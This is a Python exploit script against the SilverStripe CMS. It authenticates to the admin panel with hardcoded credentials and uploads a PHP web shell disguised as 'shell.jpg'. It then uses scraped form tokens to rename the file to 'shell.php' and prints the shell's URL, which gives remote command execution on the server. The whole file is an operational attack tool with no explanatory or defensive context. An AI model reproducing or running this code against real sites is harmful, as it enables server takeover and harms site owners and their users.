import sys, socket, re
host = 'www.example.com'
path = '/silverstripe'
username = 'admin'
password = 'Password1'
port = 80

def send_request(request):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)

    s.send(request)

    resp = ''

    while 1:
        r = s.recv(8192)
        if not r: break
        resp += r
        if r[:15] == 'HTTP/1.1 302 OK': break

    s.close()

    return resp

def upload_shell():
    print 'authenticating'

    content = 'AuthenticationMethod=MemberAuthenticator&Email=' + username + '&Password='+ password + '&action_dologin=Log+in'

    header = 'POST http://' + host + path + '/Security/LoginForm HTTP/1.1\r\n'\
             'Host: ' + host + '\r\n'\
             'Connection: keep-alive\r\n'\
             'User-Agent: x\r\n'\
             'Content-Length: ' + str(len(content)) + '\r\n'\
             'Cache-Control: max-age=0\r\n'\
             'Origin: http://' + host + '\r\n'\
             'Content-Type: application/x-www-form-urlencoded\r\n'\
             'Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n'\
             'Accept-Encoding: gzip,deflate,sdch\r\n'\
             'Accept-Language: en-US,en;q=0.8\r\n'\
             'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'\
             '\r\n'    

    resp = send_request(header + content)

    print 'uploading shell'

    match = re.findall(u'Set-Cookie:\s([^\r\n]+)', resp)

    for m in match:
        if m[:9] == 'PHPSESSID':
            cookie = m

    content = '------x\r\n'\
              'Content-Disposition: form-data; name="ID"\r\n'\
              '\r\n'\
              '0\r\n'\
              '------x\r\n'\
              'Content-Disposition: form-data; name="FolderID"\r\n'\
              '\r\n'\
              '0\r\n'\
              '------x\r\n'\
              'Content-Disposition: form-data; name="action_doUpload"\r\n'\
              '\r\n'\
              '1\r\n'\
              '------x\r\n'\
              'Content-Disposition: form-data; name="Files[1]"; filename=""\r\n'\
              '\r\n'\
              '\r\n'\
              '------x\r\n'\
              'Content-Disposition: form-data; name="Files[0]"; filename="shell.jpg"\r\n'\
              'Content-Type: image/jpeg\r\n'\
              '\r\n'\
              '<?php echo "<pre>" + system($_GET["CMD"]) + "</pre>"; ?>\r\n'\
              '------x\r\n'\
              'Content-Disposition: form-data; name="MAX_FILE_SIZE"\r\n'\
              '\r\n'\
              '\r\n'\
              '------x\r\n'\
              'Content-Disposition: form-data; name="action_upload"\r\n'\
              '\r\n'\
              'Upload Files Listed Below\r\n'\
              '------x--\r\n'\

    header = 'POST http://' + host + path + '/admin/assets/UploadForm HTTP/1.1\r\n'\
             'Host: ' + host + '\r\n'\
             'Proxy-Connection: keep-alive\r\n'\
             'User-Agent: x\r\n'\
             'Content-Length: ' + str(len(content)) + '\r\n'\
             'Cache-Control: max-age=0\r\n'\
             'Origin: http://' + host + '\r\n'\
             'Content-Type: multipart/form-data; boundary=----x\r\n'\
             'Accept: text/html\r\n'\
             'Accept-Encoding: gzip,deflate,sdch\r\n'\
             'Accept-Language: en-US,en;q=0.8\r\n'\
             'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'\
             'Cookie: ' + cookie + '\r\n'\
             '\r\n'

    resp = send_request(header + content)

    print 'grabbing ids'

    file_id = re.search(u'/\*\sIDs:\s(\d+)\s\*/', resp).group(1)
    file_name = re.search(u'/\*\sNames:\s([^\*]+)\s\*/', resp).group(1)    

    resp = send_request('GET http://' + host + path + '/admin/assets/EditForm/field/Files/item/' + file_id + '/edit?ajax=1 HTTP/1.1\r\n'\
                        'Host: ' + host + '\r\n'\
                        'Cookie: ' + cookie + '\r\n\r\n')

    print 'renaming shell'

    security_id = re.search(u'name="SecurityID" value="(\d+)"', resp).group(1)
    owner_id = re.search(u'option selected="selected" value="(\d+)"', resp).group(1)

    content = 'Title=' + file_name + '&Name=shell.php&FileType=JPEG+image+-+good+for+photos&Size=56+bytes&OwnerID=' + owner_id + '&Dimensions=x&ctf%5BchildID%5D=' + file_id + '&ctf%5BClassName%5D=File&SecurityID=' + security_id + '&action_saveComplexTableField=Save'

    header = 'POST http://' + host + path + '/admin/assets/EditForm/field/Files/item/' + file_id + '/DetailForm HTTP/1.1\r\n'\
             'Host: ' + host + '\r\n'\
             'Proxy-Connection: keep-alive\r\n'\
             'User-Agent: x\r\n'\
             'Referer: http://' + host + path + '/admin/assets/EditForm/field/Files/item/' + file_id + '/edit?ajax=1\r\n'\
             'Content-Length: ' + str(len(content)) + '\r\n'\
             'Cache-Control: max-age=0\r\n'\
             'Origin: http://' + host + '\r\n'\
             'Content-Type: application/x-www-form-urlencoded\r\n'\
             'Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n'\
             'Accept-Encoding: gzip,deflate,sdch\r\n'\
             'Accept-Language: en-US,en;q=0.8\r\n'\
             'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'\
             'Cookie: ' + cookie + '; PastMember=1\r\n'\
             '\r\n'

    resp = send_request(header + content)   

    print 'shell located at http://' + host + path + '/assets/shell.php'

upload_shell()